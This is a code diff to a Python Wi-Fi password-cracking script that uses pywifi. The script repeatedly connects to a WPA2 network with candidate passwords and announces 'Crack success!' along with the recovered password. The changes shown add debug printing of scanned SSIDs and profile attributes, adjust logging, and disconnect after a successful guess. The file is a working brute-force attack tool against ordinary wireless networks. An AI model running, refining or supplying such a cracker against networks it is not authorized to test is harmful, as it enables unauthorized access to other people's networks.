@@ -28,10 +28,10 @@ import logging
 logging.basicConfig(
     level=logging.NOTSET,
     force=True,
-    format="",
+    format="%(levelname)s | %(message)s",
     stream=sys.stdout
 )
-
+logging.getLogger('pywifi').setLevel(logging.NOTSET)
 
 # Setting the color combinations
 RED = "\033[1;31m"
@@ -43,22 +43,28 @@ BOLD = "\033[;1m"
 REVERSE = "\033[;7m"
 
 try:
+    print("[+] Init PyWifi:")
     # Interface information
     wifi = PyWiFi()
     ifaces = wifi.interfaces()[0]  # for wifi we use index - 0
 
     ifaces.scan()  # check the card
     results = ifaces.scan_results()  # Obtain the results of the previous triggerred scan. A Profile list will be returned.
+    for result in results:
+        print(result.ssid)
 
-    print(f"{results=}")
+    print(f"scan found {len(results)} networks")
+    # for result in results:
+    #     for var in vars(result):
+    #         print(f"{var:15}: {getattr(result, var)}")
 
     wifi = pywifi.PyWiFi()  # A Profile is the settings of the AP we want to connect to
     iface = wifi.interfaces()[0]
 
     # exit(0)
-    print("[+] ok")
+    print("[+] Init ok")
 except Exception as e:
-    print("[-] Error system")
+    print("[-] Init FAIL, Error system")
     print(repr(e))
     exit()
 
@@ -71,10 +77,19 @@ def main(ssid, password, number):
     profile.auth = const.AUTH_ALG_OPEN  # auth algo
     profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
     profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
-
     profile.key = password  # use generated password
+
+    print("network_profiles: ", len(iface.network_profiles()))
+    print("remove_all_network_profiles")
     iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+
+    print("network_profiles: ", len(iface.network_profiles()))
+
     tmp_profile = iface.add_network_profile(profile)  # add new profile
+
+    for var in vars(tmp_profile):
+        print(f"{var:15}: {getattr(tmp_profile, var)}")
+
     time.sleep(0.1)  # if script not working change time to 1 !!!!!!
     iface.connect(tmp_profile)  # trying to Connect
     time.sleep(0.35)  # 1s
@@ -83,6 +98,7 @@ def main(ssid, password, number):
         time.sleep(1)
         print(BOLD, GREEN, '[*] Crack success!', RESET)
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
+        iface.disconnect()
         time.sleep(1)
         exit()
     else:
